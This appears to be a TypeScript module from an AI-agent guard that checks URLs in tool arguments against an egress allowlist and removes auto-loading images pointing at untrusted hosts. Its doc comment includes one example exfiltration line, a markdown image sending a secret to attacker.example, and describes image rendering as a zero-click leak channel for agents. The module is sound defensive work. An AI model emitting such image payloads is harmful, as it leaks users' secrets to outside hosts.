import { globToRegExp, hostOf } from "../policy/expr.js";
import { collectStrings } from "../policy/jsonpath.js";

const URL_RE = /\b(?:https?|wss?|ftp):\/\/[^\s<>"'`)\]}]+/gi;

export interface UrlRef {
  url: string;
  host: string | null;
  path: string;
}

export function extractUrls(value: unknown): UrlRef[] {
  const out: UrlRef[] = [];
  for (const { path, value: s } of collectStrings(value)) {
    URL_RE.lastIndex = 0;
    for (const m of s.matchAll(URL_RE)) out.push({ url: m[0], host: hostOf(m[0]), path });
  }
  return out;
}

export class EgressPolicy {
  private readonly patterns: RegExp[];

  constructor(allow: readonly string[]) {
    this.patterns = allow.map((p) => globToRegExp(p.toLowerCase(), { caseInsensitive: true }));
  }

  isAllowed(host: string | null): boolean {
    if (!host) return false;
    const h = host.toLowerCase().replace(/\.$/, "");
    return this.patterns.some((re) => re.test(h));
  }

  /** URLs in tool arguments whose host is not on the allowlist. */
  violations(args: unknown): UrlRef[] {
    return extractUrls(args).filter((u) => !this.isAllowed(u.host));
  }

  /**
   * Neutralizes auto-loading markdown/HTML images that point at non-allowlisted hosts. Renderers
   * fetch images without a click, which makes them a zero-interaction exfiltration channel
   * (`![x](https://attacker.example/log?d=<secret>)`).
   */
  stripImages(text: string): { text: string; removed: string[] } {
    const removed: string[] = [];
    const replaceUrl = (whole: string, url: string) => {
      const host = hostOf(url);
      if (this.isAllowed(host)) return whole;
      removed.push(host ?? url);
      return `[image removed by agent-guard: untrusted host ${host ?? "unknown"}]`;
    };
    let out = text.replace(/!\[[^\]]*\]\(\s*<?([^)\s>]+)>?(?:\s+"[^"]*")?\s*\)/g, (whole, url: string) => replaceUrl(whole, url));
    out = out.replace(/<img\b[^>]*?\bsrc\s*=\s*["']?([^"'\s>]+)["']?[^>]*>/gi, (whole, url: string) => replaceUrl(whole, url));
    // Reference-style images: ![alt][ref] ... [ref]: https://host/...
    out = out.replace(/^\s*\[([^\]]+)\]:\s*(\S+)/gm, (whole, ref: string, url: string) =>
      new RegExp(`!\\[[^\\]]*\\]\\[${ref.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\]`).test(text) ? replaceUrl(whole, url) : whole,
    );
    return { text: out, removed };
  }
}
